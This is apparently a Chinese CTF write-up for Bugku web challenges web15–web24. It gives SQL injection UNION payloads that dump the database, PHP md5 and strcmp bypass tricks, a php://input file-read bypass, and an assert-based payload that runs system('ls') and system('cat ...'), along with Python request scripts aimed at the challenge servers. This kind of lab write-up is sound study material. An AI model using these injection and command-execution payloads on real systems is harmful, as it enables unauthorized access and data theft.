# web15

题目说“输入5位密码查看”，直接bp爆破或python多线程脚本爆破(可惜不会，借用了别人的脚本，python是该好好学学了)

# web16

题目提示“备份”，毫不犹豫直接拿dirsearch扫目录，果不其然，扫出来`/index.php.bak`，随后拿到备份文件，源码如下，

```php
<?php
include_once "flag.php";
ini_set("display_errors", 0);
$str = strstr($_SERVER['REQUEST_URI'], '?');//获取url，并且截取'?'开始到末尾
$str = substr($str,1);//$str从第一个字符开始截取
$str = str_replace('key','',$str);//$str中的'key'用''替换，双写绕过
parse_str($str);//将url传递的参数分别赋给变量$key1和$key2
echo md5($key1);

echo md5($key2);
if(md5($key1) == md5($key2) && $key1 !== $key2){
    echo $flag."取得flag";
}//利用md5()函数的漏洞
?>
```

代码审计得，`payload：?kkeyey1=QNKCDZO&kkeyey2=240610708`，看了一下别的师傅的`payload：?kekeyy1[]=[1]&kekeyy2[]=[2]`，学到一手md5()获取不到数组的值，会默认数组为0

# web17

“成绩查询”，显示“1,2,3...”，只有前3个有回显数据，但这个省略号让我有点怀疑，BP爆破一下但没反应，应该是SQL注入，注了再说，

`id=1`有回显，`id=1'`无回显，说明字符型注入，闭合单引号。

然后判断字段数，`1' order by 4#`有回显，`1' order by 5#`无回显，说明只有4列，判断为联合注入

接着爆库名，`id=0' union select 1,2,3,database()#`

![image-20210413202811990](C:\Users\shuoke\AppData\Roaming\Typora\typora-user-images\image-20210413202811990.png)

爆表名，`id=0' union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database()#`

![image-20210413203752124](C:\Users\shuoke\AppData\Roaming\Typora\typora-user-images\image-20210413203752124.png)

爆列名，`id=0' union select 1,2,3,group_concat(column_name) from information_schema.columns where table_schema=database()#`，

![image-20210413204149361](C:\Users\shuoke\AppData\Roaming\Typora\typora-user-images\image-20210413204149361.png)

爆数据，`id=0' union select 1,2,3,group_concat(skctf_flag) from fl4g#`，拿到flag

![image-20210413210441344](C:\Users\shuoke\AppData\Roaming\Typora\typora-user-images\image-20210413210441344.png)

# web18

页面显示“请在2s内计算老司机的车速是多少”和一长串计算式，不断刷新，会有显示“Give me value post about ”和一长串计算式，并且计算式在不断变化，应该是post传参数`value=计算式的值`，2s手算不现实，所以上python脚本，这里要注意，要保持session会话，令计算式不变

```python
import requests
import re
url='http://114.67.246.176:15718/'
s=requests.Session()#保持会话，目的使计算式不改变
source=s.get(url)
experssion=re.search(r"(\d+[+\-*])+(\d+)",source.text).group()
#正则表达式匹配计算式,group()返回为字符串
result=eval(experssion)#eval()函数用来执行一个字符串表达式，并返回表达式的值
data={'value':result}
flag=s.post(url=url,data=data).text#post传参，拿到flag
print(flag)
```

# web19

提示“速度要快”，果断BP抓包，发现Response头里有`flag:6LeR55qE6L+Y5LiN6ZSZ77yM57uZ5L2gZmxhZ+WQpzogTXpJME5URXo=`，base64解码得`跑的还不错，给你flag吧: MzI0NTEz`，显然这是个假的flag，看响应页面，发现还有一句<!-- OK ,now you have to post the margin what you find -->，margin[是CSS中简写属性，在一个声明中设置所有外边距属性]，所以参数应该是数字，`MzI0NTEz`应该再base64解码一次，得`324513`，post参数`margin=324513`，发现还没有flag，联想到上一题，可能是session一直在变，所以写python脚本

```python
import requests
import base64
import re
url='http://114.67.246.176:13484/'
s=requests.Session()#保持会话，目的使get与post时Fflag不变
Fflag=s.get(url=url).headers['flag']#获得Response头中得flag值
Fflag=base64.b64decode(Fflag).decode('UTF-8')#第一次base64解码，并UTF-8解码成字符串
Fflag=re.search('\w+$',Fflag).group()#正则匹配，拿要传参的值
Fflag=base64.b64decode(Fflag).decode('UTF-8')#第二次base64解码
post={'margin':Fflag}
Tflag=s.post(url=url,data=post).text#传参拿flag
print(Tflag)
```

# web20

提示“cookies欺骗”，打开网页，发现页面上打印一串字符串乱码，看到`url=http://114.67.246.176:14120/index.php?line=&filename=a2V5cy50eHQ=`，把`filename`的值base64解码得到`keys.txt`，根据这个url，大概可以得知，`filename`是请求文件参数，`line`则是请求文件第几行的内容，尝试传递`keys.txt`，发现没有回显，所以`filename`这个参数需要base64编码，我们将`index.php`编码后传入`filename`，果真发现回显，并且`line`的值不同，回显不同，观察回显，猜测应该是页面源码，用python获取完整源码

```python
import requests
for i in range(0,50):
    url='http://114.67.246.176:14120/index.php?line='+str(i)+'&filename=aW5kZXgucGhw'
    response=requests.get(url=url).text
    print(response)
```

拿到`index.php`源码，然后分析源码，BP伪造cookie，拿到flag

```php
<?php
error_reporting(0);
$file=base64_decode(isset($_GET['filename'])?$_GET['filename']:"");
$line=isset($_GET['line'])?intval($_GET['line']):0;
if($file=='') header("location:index.php?line=&filename=a2V5cy50eHQ=");
$file_list = array(
'0' =>'keys.txt',
'1' =>'index.php',
);
if(isset($_COOKIE['margin']) && $_COOKIE['margin']=='margin'){
$file_list[2]='keys.php';
}//这里就用到了提示，使cookie的参数为margin=margin，将keys.php值赋给$file_list[2]
if(in_array($file, $file_list)){
$fa = file($file);
echo $fa[$line];
}//如果传进来的参数$file在数组$file_list中，就会回显$file，所以将keys.php编码后传入，就能拿到flag
?>
```

# web21

页面上显示"never never never give up !!!"，然后观察到`http://114.67.246.176:10230/hello.php?id=1`，用BP爆破以下id的值，到10000都没有什么发现，F12看了以下源码，发现<!--1p.html-->，直接BP抓`http://114.67.246.176:10230/1p.html`的包，发现Javascript代码

```javascript
<SCRIPT LANGUAGE="Javascript">
<!--
var Words ="%3Cscript%3Ewindow.location.href%3D'http%3A%2F%2Fwww.bugku.com'%3B%3C%2Fscript%3E%20%0A%3C!--JTIyJTNCaWYoISUyNF9HRVQlNUInaWQnJTVEKSUwQSU3QiUwQSUwOWhlYWRlcignTG9jYXRpb24lM0ElMjBoZWxsby5waHAlM0ZpZCUzRDEnKSUzQiUwQSUwOWV4aXQoKSUzQiUwQSU3RCUwQSUyNGlkJTNEJTI0X0dFVCU1QidpZCclNUQlM0IlMEElMjRhJTNEJTI0X0dFVCU1QidhJyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJ2InJTVEJTNCJTBBaWYoc3RyaXBvcyglMjRhJTJDJy4nKSklMEElN0IlMEElMDllY2hvJTIwJ25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJyUzQiUwQSUwOXJldHVybiUyMCUzQiUwQSU3RCUwQSUyNGRhdGElMjAlM0QlMjAlNDBmaWxlX2dldF9jb250ZW50cyglMjRhJTJDJ3InKSUzQiUwQWlmKCUyNGRhdGElM0QlM0QlMjJidWdrdSUyMGlzJTIwYSUyMG5pY2UlMjBwbGF0ZWZvcm0hJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuKCUyNGIpJTNFNSUyMGFuZCUyMGVyZWdpKCUyMjExMSUyMi5zdWJzdHIoJTI0YiUyQzAlMkMxKSUyQyUyMjExMTQlMjIpJTIwYW5kJTIwc3Vic3RyKCUyNGIlMkMwJTJDMSkhJTNENCklMEElN0IlMEElMDklMjRmbGFnJTIwJTNEJTIwJTIyZmxhZyU3QioqKioqKioqKioqJTdEJTIyJTBBJTdEJTBBZWxzZSUwQSU3QiUwQSUwOXByaW50JTIwJTIybmV2ZXIlMjBuZXZlciUyMG5ldmVyJTIwZ2l2ZSUyMHVwJTIwISEhJTIyJTNCJTBBJTdEJTBBJTBBJTBBJTNGJTNF--%3E" 
function OutWord()
{
var NewWords;
NewWords = unescape(Words);//对Words进行url解码
document.write(NewWords);//输出,因为Words解码后存在一个跳转页面的script，所以直接访问会跳转到首页
} 
OutWord();
// -->
</SCRIPT>
```

对中间一长串进行base64解码，得到：

```
%22%3Bif(!%24_GET%5B'id'%5D)%0A%7B%0A%09header('Location%3A%20hello.php%3Fid%3D1')%3B%0A%09exit()%3B%0A%7D%0A%24id%3D%24_GET%5B'id'%5D%3B%0A%24a%3D%24_GET%5B'a'%5D%3B%0A%24b%3D%24_GET%5B'b'%5D%3B%0Aif(stripos(%24a%2C'.'))%0A%7B%0A%09echo%20'no%20no%20no%20no%20no%20no%20no'%3B%0A%09return%20%3B%0A%7D%0A%24data%20%3D%20%40file_get_contents(%24a%2C'r')%3B%0Aif(%24data%3D%3D%22bugku%20is%20a%20nice%20plateform!%22%20and%20%24id%3D%3D0%20and%20strlen(%24b)%3E5%20and%20eregi(%22111%22.substr(%24b%2C0%2C1)%2C%221114%22)%20and%20substr(%24b%2C0%2C1)!%3D4)%0A%7B%0A%09%24flag%20%3D%20%22flag%7B***********%7D%22%0A%7D%0Aelse%0A%7B%0A%09print%20%22never%20never%20never%20give%20up%20!!!%22%3B%0A%7D%0A%0A%0A%3F%3E
```

显然这经过了url编码，再次进行url解码，得到：

```php
";if(!$_GET['id'])
{
	header('Location: hello.php?id=1');
	exit();
}//如果无法获得$id的值,则退出脚本
$id=$_GET['id'];
$a=$_GET['a'];
$b=$_GET['b'];
if(stripos($a,'.'))
{
	echo 'no no no no no no no';
	return ;
}//过滤掉了$a中的'.'
$data = @file_get_contents($a,'r');//$a的值必须为数据流，想到php://协议
if($data=="bugku is a nice plateform!" and $id==0 and strlen($b)>5 and eregi("111".substr($b,0,1),"1114") and substr($b,0,1)!=4)
{
	$flag = "flag{***********}"
}//$id==0与if(!$_GET['id'])矛盾，用0E开头绕过或字符串，还有eregi()的绕过，$b长度大于5
else
{
	print "never never never give up !!!";
}
?>
```

最后构造`payload=http://114.67.246.176:10230/hello.php?id='a'&a=php://input&b=%00123456`

[POST data]：bugku is a nice plateform!

# web22

提示为：

```php
$poc="a#s#s#e#r#t"; 
$poc_1=explode("#",$poc);//以#为界，分割$poc，返回数组
$poc_2=$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5];//assert
$poc_2($_GET['s'])//assert($_GET['s'])
```

构造`payload：?s=system("ls")`，发现`flaga15808abee46a1d5.txt index.php`，再构造`payload：?s=system("cat flaga15808abee46a1d5.txt")`，轻松拿到flag

# web23

提示：字符，正则。代码审计，学习了以下正则表达式

```php
<?php 
highlight_file('2.php');
$key='flag{********************************}';
$IM= preg_match("/key.*key.{4,7}key:\/.\/(.*key)[a-z][[:punct:]]/i", trim($_GET["id"]), $match);//对于正则表达式，首先要做的是拆分式子，key  .*  key  .{4,7}  key:  /  .  /  (.* key)  [a-z]  [[:punct:]]，然后编写符合正则表达式的payload
if( $IM ){ 
  die('key is: '.$key);
}//符合正则匹配，执行代码
?>
```

答案有很多，这里我构造的是`payload：?id=keykeyaaaakey:/./keya!`

# web24

打开链接有一段文字，阅读这段文字，有两个关键词：“链接”，“PHP”。所以接下来是想办法搞到这个链接，用dirsearch扫描目录，没有任何发现，当我再回去仔细阅读时，才发现“链接”有个点击事件，无语。。。打开链接，看到代码，代码审计，

```php
<?php
if(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){
    $v1 = $_GET['v1'];
    $v2 = $_GET['v2'];
    $v3 = $_GET['v3'];
    if($v1 != $v2 && md5($v1) == md5($v2)){
        if(!strcmp($v3, $flag)){
            echo $flag;
        }//利用md5()漏洞绕过，而strcmp()函数，传入数组绕过
    }
}
?>
```

构造`payload：?v1=QNKCDZO&v2=240610708&v3[]=1`，在原页面传参，拿到flag

